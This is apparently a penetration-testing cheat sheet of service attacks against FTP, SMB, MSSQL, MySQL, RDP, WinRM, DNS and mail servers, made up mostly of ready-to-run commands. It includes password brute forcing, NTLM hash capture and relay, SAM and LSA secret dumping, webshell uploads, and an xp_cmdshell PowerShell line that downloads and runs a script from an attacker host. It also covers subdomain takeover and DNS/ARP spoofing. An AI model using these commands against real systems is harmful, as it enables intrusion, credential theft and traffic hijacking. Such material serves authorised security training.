# PHASE 4: SERVICE ATTACKS

## 4.1 - FTP (Port 21)
```
Decision: FTP Found?
├── Anonymous login? → Enumerate files, download sensitive data
├── Write access? → Upload webshell, overwrite configs
├── Brute force → hydra -L users.txt -P passwords.txt ftp://<target>
├── FTP Bounce → nmap -Pn -v -n -p80 -b anonymous:pass@<ftp> <internal>
└── Version vulns → searchsploit <ftp_version>
```

## 4.2 - SMB (Port 139/445)
```
Decision: SMB Found?
├── Null session? → Enumerate shares, users, groups
├── Write access? → Upload webshell, malicious files
├── Read access? → Download sensitive files
├── Brute force → hydra/netexec
├── EternalBlue? → nmap --script smb-vuln-ms17-010
├── Other vulns → searchsploit smb
├── Pass-the-Hash? → netexec smb <target> -u <user> -H <hash>
├── Responder capture? → LLMNR/NBT-NS poisoning → crack NetNTLMv2
└── NTLM Relay? → ntlmrelayx.py → relay to SMB/LDAP/ADCS
```

**Responder / NTLM Capture:**
```bash
# On attacker (capture NetNTLMv2 hashes)
sudo responder -I <interface> -wrf

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay (no cracking needed)
# Check SMB signing: nmap --script smb2-security-mode -p 445 <targets>
# If signing not required → relay works
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe  # Execute on relay
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --escalate-user <user>  # ACL abuse
```

**CrackMapExec (authenticated SMB):**
```bash
netexec smb <target> -u <user> -p '<pass>' --shares          # Shares
netexec smb <target> -u <user> -p '<pass>' --users           # Users
netexec smb <target> -u <user> -p '<pass>' --loggedon-users  # Logged-on
netexec smb <target> -u <user> -p '<pass>' --sam             # Dump SAM
netexec smb <target> -u <user> -p '<pass>' --lsa             # LSA secrets
netexec smb <target> -u <user> -p '<pass>' -x 'whoami'       # Execute command
netexec smb <target> -u <user> -p '<pass>' -X 'whoami'       # PowerShell execute
```

## 4.3 - MSSQL (Port 1433)
```
Decision: MSSQL Found?
├── Default creds? → sa:(empty), sa:sa
├── Brute force → hydra -L users.txt -P passwords.txt mssql://<target>
├── Windows auth? → sqsh -S <target> -U .\\<user> -P '<pass>'
├── xp_cmdshell → Enable and execute commands
├── Linked servers → Enumerate and abuse
├── Impacket? → mssqlclient.py <user>:<pass>@<target>
├── User impersonation? → EXECUTE AS LOGIN = 'sa'
├── Ole Automation? → sp_OACreate for file write
└── Capture hash → xp_dirtree to attacker SMB
```

**MSSQL Connection:**
```bash
# sqsh (Linux)
sqsh -S <target> -U <user> -P '<pass>'
sqsh -S <target> -U .\\<user> -P '<pass>'  # Windows auth

# Impacket (preferred)
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
mssqlclient.py <user>:'<pass>'@<target>
```

**MSSQL Command Execution:**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';

-- User impersonation (escalate to sa)
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- Verify

-- Ole Automation (file write - create webshell)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @ole INT; EXEC sp_OACreate 'scripting.filesystemobject', @ole OUT;
EXEC sp_OAMethod @ole, 'copyfile', NULL, 'C:\temp\shell.txt', 'C:\inetpub\wwwroot\shell.aspx';

-- OPENROWSET (file read)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Linked servers
EXEC sp_linkedservers;
-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [<linked_server>];

-- Hash capture (NTLMv2 to Responder)
EXEC master..xp_dirtree '\\<attacker_ip>\share';
```

## 4.4 - MySQL (Port 3306)
```
Decision: MySQL Found?
├── Default creds? → root:(empty), root:root
├── Brute force → hydra -L users.txt -P passwords.txt mysql://<target>
├── Read files → SELECT LOAD_FILE('/etc/passwd');
├── Write files → SELECT "code" INTO OUTFILE '/var/www/html/shell.php';
├── UDF RCE → If FILE privilege and writable plugin dir
└── Creds in config → Check /etc/mysql/, web app configs
```

## 4.5 - RDP (Port 3389)
```
Decision: RDP Found?
├── Brute force → hydra -L users.txt -P passwords.txt rdp://<target>
├── Password spraying → crowbar -b rdp -s <target> -U users.txt -c 'Password123'
├── Pass-the-Hash → xfreerdp /v:<target> /u:<user> /pth:<hash>
├── Session hijacking → tscon (needs SYSTEM, Server <2019)
├── BlueKeep → CVE-2019-0708 (careful, may BSOD)
└── Default creds → administrator:(empty)
```

## 4.6 - WinRM (Port 5985/5986)
```bash
# Brute force
netexec winrm <target> -u users.txt -p passwords.txt

# Connect
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H <nt_hash>

# (Pwn3d!) indicator = can execute commands
```

## 4.7 - DNS (Port 53)
```bash
# Zone transfer (information disclosure — high-value)
dig AXFR @<dns_server> <domain>
dig AXFR @<dns_server> <internal_domain>     # try internal-only zones too

# Record enumeration
dig ANY <domain> @<dns_server>
dig A <domain> @<dns_server>
dig MX <domain> @<dns_server>
dig TXT <domain> @<dns_server>
dig version.bind CHAOS TXT @<dns_server>     # BIND version → CVE lookup

# Subdomain Takeover (when CNAME points to expired third-party)
# 1. Enum subdomains
subfinder -d <domain> -v
amass enum -passive -d <domain>
# 2. Resolve each → look for dangling CNAMEs pointing to S3/Heroku/GitHub/Azure
for s in $(cat subdomains.txt); do
  host $s | grep "is an alias for" && echo "[!] dangling CNAME: $s"
done
# 3. Check response — "NoSuchBucket" / "There isn't a GitHub Pages site here" = vulnerable
curl -sI http://<subdomain> | head -20
# 4. Reference: https://github.com/EdOverflow/can-i-take-over-xyz
# 5. Claim the abandoned bucket/service → host malicious content on a trusted subdomain

# DNS Cache Poisoning (local network MITM)
# Ettercap
sudo nano /etc/ettercap/etter.dns
# Add:
#   <target_domain>      A   <attacker_ip>
#   *.<target_domain>    A   <attacker_ip>
sudo ettercap -T -i <iface> -P dns_spoof -M arp:remote /<target_ip>// /<gateway>//

# Bettercap
sudo bettercap -iface <iface>
> set dns.spoof.domains <target_domain>
> set dns.spoof.address <attacker_ip>
> set arp.spoof.targets <victim_ip>
> dns.spoof on
> arp.spoof on
```

## 4.8 - SMTP (Port 25)
```bash
# User enumeration
telnet <target> 25
VRFY admin
VRFY root
EXPN admin
RCPT TO: admin

nmap --script smtp-enum-users -p 25 <target>
```

## 4.9 - Email (POP3/IMAP)
```bash
# POP3
hydra -L users.txt -P passwords.txt pop3://<target>
nc <target> 110
USER <username>
PASS <password>
LIST
RETR <message_number>

# IMAP
hydra -L users.txt -P passwords.txt imap://<target>
openssl s_client -connect <target>:993
```

---